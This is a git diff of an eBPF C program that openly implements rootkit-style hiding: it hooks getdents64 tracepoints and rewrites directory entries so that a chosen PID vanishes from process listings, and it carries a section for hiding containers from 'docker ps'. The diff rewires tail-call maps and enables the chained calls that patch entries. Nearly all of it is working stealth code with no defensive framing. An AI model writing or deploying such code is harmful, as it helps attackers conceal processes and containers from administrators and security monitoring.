@@ -5,6 +5,12 @@
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_core_read.h>
 
+/* 
+ * ##############################
+ * HIDE CONTAINERS FROM DOCKER PS
+ * ##############################
+ */
+
 /* ringbuffer map to let userspace know when we've overwritten data */
 struct {
     __uint(type, BPF_MAP_TYPE_RINGBUF);
@@ -14,16 +20,10 @@ struct {
 /* map holding programs for tail calls */
 struct {
     __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
-    __uint(max_entries, 10);
+    __uint(max_entries, 5);
     __type(key, __u32);
     __type(value, __u32);
-} map_prog_array SEC(".maps");
-
-/* 
- * ##############################
- * HIDE CONTAINERS FROM DOCKER PS
- * ##############################
- */
+} map_prog_array_fentry SEC(".maps");
 
 /* map holding iov_data struct to pass between tail calls */
 struct {
@@ -103,7 +103,7 @@ int BPF_PROG(unix_stream_sendmsg, struct socket *sock, struct msghdr *msg,
     // bpf_printk("RECEIVED LEN: %d", data.len);
     // bpf_printk("RECEIVED DATA: %s", data.base);
 
-    bpf_tail_call(ctx, &map_prog_array, PROG_01);
+    bpf_tail_call(ctx, &map_prog_array_fentry, PROG_01);
     return 0;
 }
 
@@ -164,6 +164,7 @@ out:
  * ########
  * HIDE PID
  * ########
+ * Pulled from: https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/24-hide/pidhide.bpf.c
  */
 
 struct {
@@ -171,7 +172,7 @@ struct {
     __uint(max_entries, 8192);
     __type(key, size_t);
     __type(value, long unsigned int);
-} map_bufs SEC(".maps");
+} map_dents SEC(".maps");
 
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
@@ -188,8 +189,16 @@ struct {
     __type(value, long unsigned int);
 } map_to_patch SEC(".maps");
 
-const volatile int pid_to_hide_len;
-const volatile char pid_to_hide[MAX_PID_LEN] = "";
+/* map holding programs for tail calls */
+struct {
+    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
+    __uint(max_entries, 10);
+    __type(key, __u32);
+    __type(value, __u32);
+} map_prog_array_tp_syscall SEC(".maps");
+
+const volatile int pid_to_hide_len = 0;
+const volatile char pid_to_hide[MAX_PID_LEN] = { 0 };
 
 /* need to hook entry as well to capture dents from args[1] as args doesn't exist for sys_exit_getdents64 */
 SEC("tp/syscalls/sys_enter_getdents64")
@@ -197,11 +206,11 @@ int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     struct linux_dirent64 *dirp = (struct linux_dirent64*)ctx->args[1];
-    bpf_map_update_elem(&map_bufs, &pid_tgid, &dirp, BPF_ANY);
+    bpf_map_update_elem(&map_dents, &pid_tgid, &dirp, BPF_ANY);
     return 0;
 }
 
-// PROG_02
+// PROG_03
 SEC("tracepoint/syscalls/sys_exit_getdents64")
 int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 {
@@ -212,7 +221,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
     if (total_bytes_read <= 0)
         return 0;
 
-    long unsigned int *pbuf_addr = bpf_map_lookup_elem(&map_bufs, &pid_tgid);
+    long unsigned int *pbuf_addr = bpf_map_lookup_elem(&map_dents, &pid_tgid);
     if (!pbuf_addr)
         return 0;
     
@@ -238,8 +247,8 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
         }
         if (j == pid_to_hide_len) {
             bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
-            bpf_map_delete_elem(&map_bufs, &pid_tgid);
-            //bpf_tail_call(ctx, &map_prog_array, PROG_04);
+            bpf_map_delete_elem(&map_dents, &pid_tgid);
+            bpf_tail_call(ctx, &map_prog_array_tp_syscall, PROG_04);
         }
         bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
         bpos += d_reclen;
@@ -247,15 +256,15 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 
     if (bpos < total_bytes_read) {
         bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
-        //bpf_tail_call(ctx, &map_prog_array, PROG_03);
+        bpf_tail_call(ctx, &map_prog_array_tp_syscall, PROG_03);
     }
     bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
-    bpf_map_delete_elem(&map_bufs, &pid_tgid);
+    bpf_map_delete_elem(&map_dents, &pid_tgid);
 
     return 0;
 }
 
-// PROG_03
+// PROG_04
 SEC("tracepoint/syscalls/sys_exit_getdents64")
 int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
 {
@@ -268,12 +277,12 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
     // Unlink target, by reading in previous linux_dirent64 struct,
     // and setting it's d_reclen to cover itself and our target.
     // This will make the program skip over our folder.
-    long unsigned int buff_addr = *pbuf_addr;
-    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
+    long unsigned int buf_addr = *pbuf_addr;
+    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buf_addr;
     short unsigned int d_reclen_previous = 0;
     bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);
 
-    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
+    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buf_addr + d_reclen_previous);
     short unsigned int d_reclen = 0;
     bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
 
